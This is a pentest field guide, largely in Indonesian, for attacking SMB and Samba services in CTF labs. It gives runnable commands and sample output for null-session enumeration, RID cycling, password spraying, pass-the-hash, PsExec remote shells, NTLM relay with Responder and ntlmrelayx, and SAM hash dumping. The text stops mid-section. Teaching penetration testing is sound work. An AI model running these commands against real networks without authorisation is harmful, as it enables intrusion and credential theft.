---
id: "05"
title: "05. SMB & Samba Exploitation Workflow — Master Field Guide"
category: "2. Network Services"
categoryId: "network"
filename: "05_smb_samba-workflow.md"
refs_out: ["06","07","08","11","12","14a","14b","35","42","43","45"]
refs_in: ["04","06","07","08","09","10","11","12","14a","14b","14c","17","17b","17c","18","19","22","25","26","35","36","37","38","39","41","42","46","54","57","58","61","62","63","64"]
---

# 05. SMB & Samba Exploitation Workflow — Master Field Guide

```text
==================================================================================
DOCUMENTATION TYPE : Service Exploitation Workflow (Network & Infrastructure)
SERVICE TARGET     : SMB (Server Message Block) / Samba
DEFAULT PORTS      : TCP 445 (SMB direct over IP), TCP 139 (NetBIOS Session Service)
TARGET AUDIENCE    : Penetration Testers, CTF Players (HTB / THM / Proving Grounds)
PLATFORM CONTEXT   : Parrot OS XFCE / Debian CLI
PREREQUISITES      : [03. Nmap Master Workflow & Network Scanning — Panduan Komprehensif](/docs/nmap-master), [04. Service Identification & Master Decision Tree — Pentest GPS Navigator](/docs/service-identification-decision-tree)
==================================================================================
```

---

## 🧠 BAGIAN 1: SMB FUNDAMENTALS

### 1.1 Apa itu SMB? (Analogi Lemari Arsip Kantor)

**Server Message Block (SMB)** adalah protokol jaringan *client-server* yang digunakan untuk berbagi file (*file sharing*), printer, serial port, dan komunikasi antar-proses (*named pipes*) di dalam jaringan lokal.

```text
+=============================================================================+
|                        ANALOGI LEMARI ARSIP KANTOR                          |
+=============================================================================+
|                                                                             |
|  [ LEMARI ARSIP PUSAT ]                                                     |
|                                                                             |
|  ├── Laci "Brosur Umum" (Public Share)                                      |
|  │   └── Tidak digembok sama sekali. Siapa pun boleh membuka dan membaca    |
|  │       dokumen di dalamnya (ANONYMOUS / GUEST ACCESS).                    |
|  │                                                                          |
|  ├── Laci "Keuangan & Gaji" (Restricted Share)                              |
|  │   └── Digembok tebal. Hanya karyawan dengan kunci otentikasi valid       |
|  │       yang diizinkan masuk (CREDENTIALED ACCESS: User + Password).       |
|  │                                                                          |
|  └── Kotak Surat Masuk (IPC$ Share / Named Pipes)                           |
|      └── Celah surat untuk mengajukan formulir tanya-jawab internal         |
|          tanpa perlu membuka lemari utama (NULL SESSION RPC QUERY).         |
+=============================================================================+
```

---

### 1.2 Evolusi Versi SMB & Dampak Eksploitasi

| Versi SMB | Dirilis Bersama OS | Fitur Utama & Kelemahan Keamanan | CVE / Kerentanan Kritis |
| :--- | :--- | :--- | :--- |
| **SMBv1 (CIFS)** | Windows NT 4.0 / 2000 / XP / 2003 | Sangat lambat, tidak aman, enkripsi lemah/tidak ada, mendukung null session tanpa batas. | **MS17-010 (EternalBlue)**, **MS08-067**, **SambaCry (CVE-2017-7494)** |
| **SMBv2.0 / 2.1** | Windows Vista / 7 / Server 2008 | Peningkatan performa drastis (*pipelining*), dukungan SMB Signing yang lebih kuat. | Rentan NTLM Relay jika SMB Signing berstatus *Not Required*. |
| **SMBv3.0 / 3.1.1** | Windows 8 / 10 / 11 / Server 2012+ | *End-to-End AES Encryption*, *Pre-Authentication Integrity*. Sangat aman secara arsitektur. | **SMBGhost (CVE-2020-0796)** pada kompresi SMBv3.1.1. |

> [!IMPORTANT]
> **Kenapa Versi Sangat Menentukan Strategi Serangan?**
> * Jika target menjalankan **SMBv1**, prioritaskan mencari celah Remote Code Execution (RCE) langsung tanpa otentikasi (seperti *EternalBlue*).
> * Jika target menjalankan **SMBv2 / SMBv3**, alihkan strategi ke **Enumerasi Informasi (*Information Disclosure*)**, pencarian miskonfigurasi share publik, ekstraksi file backup, atau *Password Spraying*.

---

### 1.3 Membedakan Windows SMB vs. Linux Samba dari Nmap

Anda harus segera membedakan target Windows asli atau Linux Samba karena struktur path, sistem hak akses, dan exploit path keduanya berbeda total (`C:\path\to\file` vs `/var/samba/share`).

```text
+-----------------------------------------------------------------------------+
| CONTOH OUTPUT NMAP: WINDOWS ASLI                                            |
| 445/tcp open  microsoft-ds  Microsoft Windows 7 - 10 (workgroup: WORKGROUP) |
| Service Info: OS: Windows; OS Group: Windows 2000/XP/Vista/7/8/10           |
+-----------------------------------------------------------------------------+
| CONTOH OUTPUT NMAP: LINUX SAMBA                                             |
| 445/tcp open  netbios-ssn   Samba smbd 4.6.2 (workgroup: WORKGROUP)         |
| Service Info: OS: Unix; CPE: cpe:/o:linux:linux_kernel                      |
+-----------------------------------------------------------------------------+
```

* **Windows**: Banner menyebutkan *Microsoft Windows*, *Windows Server*, dan nama NetBIOS format huruf besar (`CORP-DC01`). Ping TTL bernilai **~128**.
* **Linux Samba**: Banner secara eksplisit menyebutkan *Samba smbd X.X.X* atau nama domain workgroup Unix. Ping TTL bernilai **~64**.

---

### 1.4 Port 139 vs. Port 445

```text
+-------------------+-------------------------------------------------------------+
| Port              | Mekanisme & Karakteristik Protokol                          |
+-------------------+-------------------------------------------------------------+
| Port 139 (NetBIOS)| SMB berjalan di atas NetBIOS over TCP/IP (NBT). Protokol    |
|                   | legacy (Windows 95/98/NT). Menggunakan nama NetBIOS 16-char.|
+-------------------+-------------------------------------------------------------+
| Port 445 (SMB)    | SMB langsung berjalan di atas TCP/IP murni ("naked SMB").   |
|                   | Lebih cepat, modern (Windows 2000 ke atas), standar de facto.|
+-------------------+-------------------------------------------------------------+
```

* **Kapan keduanya muncul bersamaan?** Hampir selalu pada sistem Windows dan Linux Samba untuk kompatibilitas mundur (*backward compatibility*).
* **Prioritas Pentest**: Selalu serang port **445** terlebih dahulu. Gunakan port **139** jika port 445 diblokir firewall atau jika enumerasi NetBIOS Name (`nbtscan`) diperlukan.

---

### 1.5 Istilah Kunci SMB

* **Share**: Direktori pada target yang diekspos ke jaringan (contoh: `\\TARGET\public` atau `\\TARGET\C$`).
* **Administrative Shares**: Share bawaan Windows berakhiran tanda dollar (`$`) seperti `C$`, `ADMIN$`, `IPC$`. Tanda dollar menyembunyikan share dari *network browsing* biasa dan membutuhkan izin Administrator.
* **IPC$ (Inter-Process Communication Share)**: Share khusus untuk komunikasi *Named Pipes* (RPC). Mengizinkan klien mengeksekusi fungsi RPC tanpa mengakses sistem file langsung.
* **Null Session**: Koneksi SMB tanpa username dan tanpa password (`username=""`, `password=""`). Pada SMBv1 atau Samba yang *misconfigured*, ini mengizinkan dump user, group, dan share list secara penuh.
* **Anonymous / Guest Access**: Login menggunakan akun built-in `guest` atau username bebas tanpa password untuk membaca folder publik.
* **RID Cycling**: Teknik mengekstrak nama user sistem dengan melakukan enumerasi berurutan pada *Relative Identifier* (RID) dari SID domain/host (RID 500 = Administrator, RID 501 = Guest, RID 1000+ = User biasa).

---

### 1.6 SMB Signing & Pengaruhnya pada NTLM Relay Attack

**SMB Signing** adalah mekanisme di mana setiap paket data SMB diberi tanda tangan digital (*digital signature*) menggunakan kunci sesi bersama untuk mencegah manipulasi data di tengah jalan (*Man-in-the-Middle*).

```text
+------------------------------------+---------------------------------------------------+
| Status SMB Signing Target          | Dampak Terhadap Eksploitasi Pentester             |
+------------------------------------+---------------------------------------------------+
| Signing: disabled / NOT REQUIRED   | TARGET RENTAN! Kredensial NTLM Hash hasil poison  |
| (Default pada Windows Client)      | (Responder) dapat di-RELAY langsung ke target     |
|                                    | untuk eksekusi shell (impacket-ntlmrelayx).       |
+------------------------------------+---------------------------------------------------+
| Signing: enabled & REQUIRED        | TARGET AMAN dari Relay. Anda TIDAK BISA me-relay  |
| (Default pada Domain Controller)   | hash ke mesin ini. Anda terpaksa harus meng-crack |
|                                    | hash tersebut secara offline via Hashcat.         |
+------------------------------------+---------------------------------------------------+
```

---

## 🛠️ BAGIAN 2: TOOL ARSENAL SMB

```text
=======================================================================================================
TOOL               FUNGSI UTAMA                    KECEPATAN   STEALTH   ANONYMOUS CHECK   AUTH CHECK
=======================================================================================================
smbclient          Interactive CLI & File Transfer Cepat       Tinggi    Ya                Ya
smbmap             Share & Permission Enumerator   Sangat Cepat Sedang   Ya                Ya
enum4linux-ng      Full OS/User/Share Enumeration  Sedang      Rendah    Ya                Ya
nxc (NetExec)      Swiss-Army Knife, Spray & Exec  Sangat Cepat Sedang   Ya                Ya
rpcclient          Low-level MS-RPC Interface      Cepat       Tinggi    Ya                Ya
impacket-smbclient Pythonic Flexible SMB Client    Cepat       Tinggi    Ya                Ya
nmap (NSE)         Vulnerability & Config Scanner  Sedang      Rendah    Ya                Ya
crackmapexec       Legacy Version of NetExec       Sangat Cepat Sedang   Ya                Ya
=======================================================================================================
```

---

### 2.1 `smbclient` — Interactive SMB Client
* **Fungsi**: Menghubungkan terminal kita ke share SMB layaknya FTP client interaktif.
* **Kapan Digunakan**: Menjelajah folder share, upload file exploit/webshell, dan download file backup secara manual.
* **Flag Penting**:
  * `-N` : *No password* (mencoba null/anonymous login).
  * `-L <target>` : *List* share yang ada di target.
  * `-U <user>` : Menentukan username login.
  * `-c '<command>'` : Menjalankan sub-command non-interaktif langsung dari bash.

```bash
# Contoh 1: Menampilkan list share tanpa password (Null session)
smbclient -N -L //10.10.11.200/

# Contoh 2: Masuk ke dalam share 'public' secara interaktif tanpa password
smbclient -N //10.10.11.200/public

# Contoh 3: Masuk dengan kredensial teridentifikasi
smbclient -U 'developer%P@ssw0rd123' //10.10.11.200/development
```

* **Contoh Output Nyata**:
```text
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	public          Disk      Public Department Share
	backups         Disk      System Backups Archive
SMB1 disabled -- running SMB2/SMB3: Genuine Windows Server 2016 Standard 14393
```
* **Cara Baca Output**: Abaikan share `ADMIN$`, `C$` jika tanpa password. Catat share kustom: `public` dan `backups`.

---

### 2.2 `smbmap` — Share & Permission Mapper
* **Fungsi**: Memetakan seluruh share dan langsung memeriksa permission (`NO ACCESS`, `READ ONLY`, `READ, WRITE`) secara otomatis.
* **Kapan Digunakan**: Quick triage saat pertama kali port 445 ditemukan terbuka.
* **Flag Penting**:
  * `-H <target>` : Host IP target.
  * `-u <user>` : Username (gunakan `""` atau `'guest'` untuk anon).
  * `-p <pass>` : Password.
  * `-R <share>` : *Recursive directory listing*.
  * `--download '<regex>'` : Download file yang cocok dengan regex secara rekursif.

```bash
# Mapping permission tanpa kredensial (Anonymous)
smbmap -H 10.10.11.200

# Mapping dengan user dan password
smbmap -H 10.10.11.200 -u "svc_backup" -p "Backup2023!"

# Listing rekursif pada share tertentu
smbmap -H 10.10.11.200 -u "guest" -p "" -R "public"

# Download seluruh file dari share secara rekursif
smbmap -H 10.10.11.200 -u "guest" -p "" -R "public" --download '.*'
```

* **Contoh Output Nyata**:
```text
[+] IP: 10.10.11.200:445	Name: corp-fileserver.local
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	public                                            	READ ONLY	Public Department Share
	backups                                           	READ, WRITE	System Backups Archive
```
* **Cara Baca Output**: Fokus ke kolom `Permissions`. `READ ONLY` berarti bisa di-loot isinya, `READ, WRITE` berarti bisa diunggah file webshell atau reverse shell.

---

### 2.3 `enum4linux-ng` — Comprehensive OS & Samba Enumerator
* **Fungsi**: Script modern berbasis Python untuk mengumpulkan seluruh informasi dari host Windows / Samba secara otomatis.
* **Kapan Digunakan**: Enumerasi komprehensif saat null session atau kredensial valid ditemukan.
* **Flag Penting**:
  * `-A` : *All simple checks* (menjalankan semua modul enumerasi dasar).
  * `-U` : Enumerasi Users.
  * `-S` : Enumerasi Shares.
  * `-R` : RID Cycling enumerasi user.

```bash
# Menjalankan full enumerasi dasar (Null session check)
enum4linux <TARGET-IP> -a -oA enum4linux_report
```

---

### 2.4 `nxc` (NetExec) — Modern Multi-Purpose SMB Tool
* **Fungsi**: Pengganti resmi *CrackMapExec*. Alat tercepat untuk memvalidasi kredensial, password spraying, dump share, eksekusi command, dan cek SMB signing.
* **Kapan Digunakan**: Seluruh fase pentest (recon, auth check, lateral movement).
* **Flag Penting**:
  * `smb` : Modul protokol.
  * `-u <user/file>` : Username tunggal atau file list user.
  * `-p <pass/file>` : Password tunggal atau file list password.
  * `--shares` : Enumerate share & permission.
  * `--users` : Enumerate domain/local user.
  * `--rid-brute` : Menjalankan RID Cycling otomatis.
  * `--local-auth` : Otentikasi ke akun lokal mesin (bukan domain AD).

```bash
# 1. Cek SMB banner, signing status, dan OS version
nxc smb 10.10.11.200

# 2. Cek Anonymous share access
nxc smb 10.10.11.200 -u '' -p '' --shares

# 3. Validasi kredensial (Local admin vs standard user)
nxc smb 10.10.11.200 -u 'Administrator' -p 'P@ssword1' --local-auth
```

* **Contoh Output Nyata**:
```text
SMB         10.10.11.200    445    FILE01           [*] Windows 10.0 Build 17763 x64 (name:FILE01) (domain:CORP) (signing:False) (SMBv1:False)
SMB         10.10.11.200    445    FILE01           [+] CORP\admin:Password123 (Pwn3d!)
```
* **Cara Baca Output**:
  * `(signing:False)` : SMB signing tidak diwajibkan (bisa di-relay).
  * `[+]` : Kredensial valid.
  * `(Pwn3d!)` : User memiliki hak **Administrator Lokal** (bisa spawn shell via `psexec`/`wmiexec`!).

---

### 2.5 `rpcclient` — MS-RPC Low-Level Client
* **Fungsi**: Berkomunikasi langsung dengan antarmuka Microsoft RPC melalui named pipe SMB (`\PIPE\samr` atau `\PIPE\lsarpc`).
* **Kapan Digunakan**: Ketika Null Session terbuka dan ingin mengekstrak data user/domain secara manual dan presisi.

```bash
# Membuka prompt RPC interaktif tanpa password
rpcclient -U "" -N 10.10.11.200
```

---

### 2.6 `impacket-smbclient` — Python SMB Client
* **Fungsi**: Implementasi client SMB dari Impacket suite.
* **Kapan Digunakan**: Saat `smbclient` biasa gagal negosiasi atau saat login dengan NTLM Hash (*Pass-The-Hash*).

```bash
# Menggunakan NTLM Hash tanpa plaintext password (Pass-The-Hash)
impacket-smbclient Administrator@10.10.11.200 -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

---

### 2.7 `nmap` SMB Scripts (NSE)
* **Fungsi**: Deteksi celah keamanan kritis, enumerasi share, dan konfigurasi protokol secara non-interaktif.

```bash
# Audit seluruh celah keamanan SMB yang diketahui
nmap -p 139,445 --script "smb-vuln*" --script-args unsafe=1 $TARGET

# Enumerasi shares dan permission secara otomatis
nmap -p 139,445 --script "smb-enum-shares,smb-enum-users" $TARGET

# Deteksi OS, domain, dan SMB signing
nmap -p 139,445 --script "smb-os-discovery,smb-security-mode" $TARGET
```

---

## 🧭 BAGIAN 3: WORKFLOW UTAMA (FASE DEMI FASE)

### FASE 0: FINGERPRINT & HOST DISCOVERY
Sebelum melancarkan teknik invasif, identifikasi sistem operasi dan parameter SMB secara pasif dan aktif.

```bash
# 1. Cek TTL Ping
ping -c 3 $TARGET
# TTL ~128 -> Windows
# TTL ~64  -> Linux (Samba)

# 2. NetExec Quick Check
nxc smb $TARGET
# Output menampilkan: OS, Hostname, Domain name, SMB Signing status, SMBv1 support

# 3. Nmap OS & Version Discovery
sudo nmap -sC -sV -p 139,445 $TARGET -oN nmap_smb_discovery.txt
```

---

### FASE 1: ANONYMOUS & NULL SESSION CHECK
Menguji apakah server mengizinkan akses tanpa otentikasi (guest atau null session).

```bash
# 1. Cek anonymous share access dengan smbclient
smbclient -N -L //$TARGET/

# 2. Cek permission shares dengan smbmap
smbmap -H $TARGET

# 3. NetExec Anonymous check
nxc smb $TARGET -u '' -p '' --shares
nxc smb $TARGET -u 'guest' -p '' --shares
nxc smb $TARGET -u 'nobody' -p '' --shares

# 4. enum4linux-ng anonymous sweep
enum4linux-ng -A $TARGET -u '' -p ''
```

---

### FASE 2: SHARE ENUMERATION & FILE LOOTING
Jika ada share yang dapat dibaca (READ permissions), unduh dan cari dokumen sensitif, konfigurasi, backup, dan credential artifacts.

```bash
# 1. Download seluruh isi share secara rekursif
smbclient -N //$TARGET/public -c 'recurse ON; prompt OFF; mget *'

# 2. Unduh dengan smbmap
smbmap -H $TARGET -u 'guest' -p '' -R public --download '.*'

# 3. Cari string sensitif di file yang terdownload
grep -ri "password" ./loot/
grep -ri "user" ./loot/
grep -ri "key" ./loot/
find ./loot/ -name "*.kdbx" -o -name "*.bak" -o -name "*.conf" -o -name "*.old" -o -name "*id_rsa*"

# 4. Jika share writable: Uji write access
touch test.txt
smbclient -N //$TARGET/public -c 'put test.txt'
```

---

### FASE 3: RPC ENUMERATION & RID CYCLING
Jika SMB Anonymous ditolak tetapi port 445/139 terbuka, manfaatkan query RPC untuk mengekstrak user list dan informasi domain.

```bash
# 1. Query rpcclient dengan Null Session
rpcclient -U "" -N $TARGET

# Perintah di dalam rpcclient:
# enumdomusers      -> list user domain/lokal
# enumdomgroups     -> list grup
# queryuser <RID>   -> detail user tertentu
# lookupnames admin -> cari SID user admin
# getdompwinfo      -> cek password policy (lockout threshold!)

# 2. Otomasi RID Brute-Forcing via NetExec
nxc smb $TARGET -u '' -p '' --rid-brute 10000 | grep SidTypeUser | tee users_discovered.txt

# 3. Ekstrak nama user murni untuk wordlist
cat users_discovered.txt | awk '{print $5}' | cut -d '\' -f 2 > users.txt
```

---

### FASE 4: VULNERABILITY SCANNING
Memeriksa kerentanan remote code execution (RCE) pre-auth pada protokol SMB.

```bash
# 1. Nmap Vuln Scripts
nmap -p 139,445 --script "smb-vuln-*" --script-args unsafe=1 $TARGET

# 2. Deteksi MS17-010 (EternalBlue)
nxc smb $TARGET -M ms17-010
nmap -p 445 --script smb-vuln-ms17-010 $TARGET

# 3. Deteksi SMBGhost (CVE-2020-0796)
nxc smb $TARGET -M smbghost

# 4. Deteksi SambaCry (CVE-2017-7494) pada Linux Samba
nmap -p 445 --script smb-vuln-cve-2017-7494 $TARGET
```

---

### FASE 5: PASSWORD SPRAYING & BRUTEFORCE
Setelah mengumpulkan username dari RPC atau looting, lakukan spraying terarah dengan mematuhi lockout policy.

```bash
# 1. Password spraying satu password ke banyak user (AMAN dari lockout)
nxc smb $TARGET -u users.txt -p 'Spring2023!' --continue-on-success

# 2. Uji username sama dengan password
nxc smb $TARGET -u users.txt --no-bruteforce --continue-on-success

# 3. Targeted dictionary attack (jika lockout policy = 0 / unlimited)
nxc smb $TARGET -u 'administrator' -p /usr/share/wordlists/rockyou.txt
```

---

### FASE 6: AUTHENTICATED ENUMERATION
Setelah mendapatkan satu pasang kredensial valid (User + Password atau NTLM Hash):

```bash
# 1. Cek semua shares dengan kredensial baru
nxc smb $TARGET -u "$USER" -p "$PASS" --shares

# 2. Cek apakah user memiliki hak administratif (Pwn3d!)
nxc smb $TARGET -u "$USER" -p "$PASS"

# 3. Cek Kerberoasting (jika di domain AD)
impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip $TARGET -request

# 4. Dump SAM hashes jika user adalah local admin
impacket-secretsdump "$DOMAIN/$USER:$PASS@$TARGET"
```

---

### FASE 7: EXPLOITATION & REMOTE CODE EXECUTION
Mendapatkan shell interaktif jika memiliki kredensial administratif.

```bash
# Method 1: PsExec (Paling umum, spawn SYSTEM)
impacket-psexec "$USER:$PASS@$TARGET"

# Method 2: WMIExec (lebih stealth, tidak buat service)
impacket-wmiexec "$USER:$PASS@$TARGET"

# Method 3: SMBExec (stealth, tidak upload binary)
impacket-smbexec "$USER:$PASS@$TARGET"

# Method 4: Pass-The-Hash versions
impacket-psexec "Administrator@$TARGET" -hashes "$NTLM_HASH"
impacket-wmiexec "Administrator@$TARGET" -hashes "$NTLM_HASH"
```

**OUTPUT BERHASIL ✅ — PsExec:**

```text
[*] Requesting shares on 10.10.11.200.....
[*] Found writable share ADMIN$
[*] Uploading payload...
[*] Created \pwned.exe service
Microsoft Windows [Version 10.0.17763.2628]
C:\Windows\system32> whoami
nt authority\system
```

**OUTPUT GAGAL ❌ — PsExec: Access Denied:**

```text
[-] SMB SessionError: STATUS_ACCESS_DENIED
```

➡️ User bukan local admin. Coba WMIExec atau cek privilege:

```bash
nxc smb $TARGET -u "$USER" -p "$PASS" --local-auth
# Jika (Pwn3d!) -> user adalah local admin tapi mungkin UAC blocking
# Coba: impacket-wmiexec -nooutput atau via winrm
```

---

## FASE 8: NTLM RELAY ATTACK

> Prasyarat: SMB Signing = disabled/not required (dari Langkah 0.2)

```bash
# LANGKAH 8.1: Buat target list untuk relay
# Scan network untuk host dengan signing disabled
nxc smb 10.10.11.0/24 --gen-relay-list relay_targets.txt

# LANGKAH 8.2: Setup ntlmrelayx di terminal 1
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -l loot

# LANGKAH 8.3: Setup Responder di terminal 2 (matikan SMB dan HTTP di Responder)
# Edit /etc/responder/Responder.conf: SMB = Off, HTTP = Off
sudo responder -I tun0 -rdwv

# LANGKAH 8.4: Tunggu authentication event dari network
# (atau trigger dengan link injection di web app, email phishing internal, dll)
```

**OUTPUT BERHASIL ✅ — Hash di-relay:**

```text
[*] SMBD-Thread-4: Received connection from 10.10.11.50
[*] Authenticating against smb://10.10.11.200 as CORP\svc_backup SUCCEED
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target: 10.10.11.200
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971881:::
```

---

## FASE 9: POST-EXPLOITATION & PIVOT HINTS

### Setelah Dapat Shell — Kumpulkan Informasi untuk Lateral Movement

```bash
# Di Windows shell:
# 1. Dump credentials lokal
C:\> reg save HKLM\SAM sam.bak
C:\> reg save HKLM\SYSTEM system.bak
# Download lalu:
impacket-secretsdump -sam sam.bak -system system.bak LOCAL

# 2. Cek network untuk target berikutnya
C:\> ipconfig /all
C:\> net view /domain
C:\> arp -a

# 3. Cek share yang bisa diakses dari dalam
C:\> net use \\DC01\C$ /user:Administrator Password123!
C:\> net view \\DC01\

# Di Linux shell:
# 1. Cari credentials lain
cat /etc/passwd
cat /etc/shadow   # butuh root
find / -name "*.conf" -readable 2>/dev/null | xargs grep -i password 2>/dev/null

# 2. Cek koneksi aktif (target pivot berikutnya)
ss -tunp
netstat -tunp
arp -n
```

### Cross-Service Credential Testing Chart

Setiap kali dapat credentials dari SMB, test ke service ini:

```text
SMB Creds Found
     │
     ├─ ─→ Port 22  (SSH)     → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold"><a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a></a>
     ├──→ Port 21  (FTP)     → <a href="/docs/ftp" class="text-[#00b4d8] hover:underline font-mono font-semibold"><a href="/docs/ftp" class="text-[#00b4d8] hover:underline font-mono font-semibold">07_ftp_workflow.md</a></a>
     ├──→ Port 25  (SMTP)    → <a href="/docs/smtp" class="text-[#00b4d8] hover:underline font-mono font-semibold"><a href="/docs/smtp" class="text-[#00b4d8] hover:underline font-mono font-semibold">08_smtp_workflow.md</a></a>
     ├──→ Port 389 (LDAP)    → <a href="/docs/ldap" class="text-[#00b4d8] hover:underline font-mono font-semibold"><a href="/docs/ldap" class="text-[#00b4d8] hover:underline font-mono font-semibold">11_ldap_workflow.md</a></a>
     ├──→ Port 3389 (RDP)    → <a href="/docs/rdp" class="text-[#00b4d8] hover:underline font-mono font-semibold"><a href="/docs/rdp" class="text-[#00b4d8] hover:underline font-mono font-semibold">12_rdp_workflow.md</a></a>
     ├──→ Port 5985 (WinRM)  → evil-winrm
     ├──→ Port 1433 (MSSQL)  → <a href="/docs/mssql" class="text-[#00b4d8] hover:underline font-mono font-semibold"><a href="/docs/mssql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14b_mssql_workflow.md</a></a>
     ├──→ Port 3306 (MySQL)  → <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold"><a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a></a>
     └──→ AD Environment     → <a href="/docs/ad-initial-enumeration" class="text-[#00b4d8] hover:underline font-mono font-semibold"><a href="/docs/ad-initial-enumeration" class="text-[#00b4d8] hover:underline font-mono font-semibold">35_ad_initial_enumeration_workflow.md</a></a>
```

---

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

| Error | Penyebab | Solusi |
|---|---|---|
| `NT_STATUS_ACCESS_DENIED` | Anonymous diblokir | Coba `guest`, `nobody`, atau beralih ke RPC |
| `NT_STATUS_LOGON_FAILURE` | Username/pass salah | Cek `--local-auth`, cek domain vs local |
| `NT_STATUS_CONNECTION_REFUSED` | Port 445 diblokir | Coba port 139, tambah `-Pn` di nmap |
| `NT_STATUS_INVALID_NETWORK_RESPONSE` | SMBv1 needed | `smbclient --option='client min protocol=NT1'` |
| `NT_STATUS_BAD_NETWORK_NAME` | Share name salah | `smbmap -H $TARGET` untuk list yang benar |
| `NT_STATUS_ACCOUNT_LOCKED_OUT` | Terlalu banyak spray | STOP! Tunggu lockout duration, cek `getdompwinfo` |
| `NT_STATUS_PASSWORD_MUST_CHANGE` | First login force change | `smbpasswd -r $TARGET -U username` |
| `Connection timeout` | Firewall | `nmap -Pn -sS -p 445 --source-port 53 $TARGET` |
| `SPNEGO/Kerberos error` | FQDN tidak resolve | `echo "$TARGET domain.local hostname" >> /etc/hosts` |
| `signing:True relay blocked` | SMB Signing required | Crack hash offline: `hashcat -m 5600 hash.txt rockyou.txt` |
| Exploit crash / no session | Target tidak stabil | Coba WMIExec atau SMBExec sebagai alternatif PsExec |

---

## MASTER DECISION TREE (RINGKASAN)

```text
START: Port 445/139 Open
│
├─ FASE 0: Fingerprint
│   ├─ TTL ~128 → Windows
│   ├─ TTL ~64  → Linux Samba
│   └─ nxc smb → OS, Signing status, SMBv1
│
├─ FASE 1: Anonymous Check
│   ├─ [Share accessible] → FASE 2 (Looting)
│   └─ [All denied]       → FASE 3 (RPC) → FASE 4 (Vuln Scan)
│
├─ FASE 2: File Looting
│   ├─ [Password ditemukan]   → FASE 6 (Authenticated Enum)
│   ├─ [SSH key ditemukan]    → Crack passphrase → SSH
│   ├─ [Writable = web root]  → Upload webshell → SHELL
│   └─ [Tidak ada sensitif]   → FASE 3
│
├─ FASE 3: RPC Enumeration
│   └─ [User list]         → FASE 5 (Password Spray)
│
├─ FASE 4: Vulnerability Scan
│   ├─ [MS17-010 VULN]     → PATH A (EternalBlue → SYSTEM)
│   ├─ [SambaCry VULN]     → PATH B (SambaCry → ROOT)
│   └─ [Not vulnerable]    → FASE 5
│
├─ FASE 5: Password Spray
│   ├─ [(Pwn3d!) Admin]    → PATH D (PsExec/WMIExec → SYSTEM)
│   └─ [Standard user]     → FASE 6
│
├─ FASE 6: Authenticated Enum
│   ├─ [More shares found] → Loot more
│   ├─ [Kerberoast hash]   → Crack → AD pivot
│   └─ [NTLM hash]         → PTH → Lateral movement
│
└─ FASE 7-9: Exploitation & Post-Exploitation
    └─ [Shell obtained] → Collect info → Pivot ke target lain
```

---

# SMB/Samba Complete Attack Workflow — Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun. Satu kali di awal sesi.
export TARGET="10.10.11.200"
export LHOST="10.10.14.5"        # IP tun0 kamu (VPN HTB/THM)
export LPORT="4444"
mkdir -p ~/smb_loot/{files,creds,keys}
cd ~/smb_loot

echo "[*] Target: $TARGET | LHOST: $LHOST"
```

**Output yang diharapkan:**

text

```
[*] Target: 10.10.11.200 | LHOST: 10.10.14.5
```

---

## ═══════════════════════════════════════

## FASE 0: KONFIRMASI PORT AKTIF

## ═══════════════════════════════════════

### Langkah 0.1 — Ping Test (Deteksi OS via TTL)

Bash

```
ping -c 3 $TARGET
```

**OUTPUT BERHASIL ✅ — TTL ~128 (Windows):**

text

```
64 bytes from 10.10.11.200: icmp_seq=1 ttl=127 time=45.2 ms
```

➡️ **Kesimpulan:** Target adalah **Windows**. Catat ini. Lanjut ke **Langkah 0.2**

**OUTPUT BERHASIL ✅ — TTL ~64 (Linux):**

text

```
64 bytes from 10.10.11.200: icmp_seq=1 ttl=63 time=23.1 ms
```

➡️ **Kesimpulan:** Target adalah **Linux Samba**. Catat ini. Lanjut ke **Langkah 0.2**

**OUTPUT GAGAL ❌ — Request timeout:**

text

```
Request timeout for icmp_seq 0
```

➡️ **Artinya:** Firewall blokir ICMP. Host mungkin tetap hidup.  
➡️ **Solusi:** Lanjut langsung ke Langkah 0.2, tambahkan flag `-Pn` di semua nmap.

---

### Langkah 0.2 — Fast Port Check (Konfirmasi SMB aktif)

Bash

```
# Command 1: Quick check dengan nxc (paling cepat, 1 command kasih banyak info)
nxc smb $TARGET
```

**OUTPUT BERHASIL ✅:**

text

```
SMB   10.10.11.200  445  DC01  [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:CORP.LOCAL) (signing:False) (SMBv1:False)
```

**Cara baca output ini — PENTING, catat semua:**

|Field|Nilai Contoh|Arti & Tindakan|
|---|---|---|
|`Windows 10.0 Build 17763`|OS Version|Build 17763 = Server 2019. Cari exploit sesuai versi|
|`name:DC01`|Hostname|Tambahkan ke `/etc/hosts` jika perlu|
|`domain:CORP.LOCAL`|Domain Name|Ini environment **Active Directory** → nanti pivot ke AD|
|`signing:False`|SMB Signing OFF|**KRITIS!** Bisa NTLM Relay attack|
|`signing:True`|SMB Signing ON|Relay attack tidak bisa, harus crack hash offline|
|`SMBv1:True`|SMBv1 aktif|**PRIORITAS!** Cek MS17-010 / EternalBlue dulu|
|`SMBv1:False`|SMBv1 mati|Skip EternalBlue, fokus ke enumeration|

**OUTPUT GAGAL ❌ — Connection refused:**

text

```
